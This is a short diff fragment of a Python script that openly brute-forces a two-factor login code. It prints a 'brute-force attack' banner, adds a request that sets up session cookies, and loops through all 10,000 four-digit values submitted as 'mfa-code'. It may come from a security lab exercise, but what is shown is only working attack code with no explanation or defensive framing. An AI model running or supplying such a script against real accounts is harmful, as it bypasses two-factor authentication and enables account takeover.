@@ -14,6 +14,7 @@ headers = {
 
 session = requests.Session()
 print("[*] Starting the 2FA code brute-force attack...")
+session.get(url, headers=headers, cookies=cookies)
 for i in range(10000):
     code = f"{i:04d}"
     data = {"mfa-code": code}
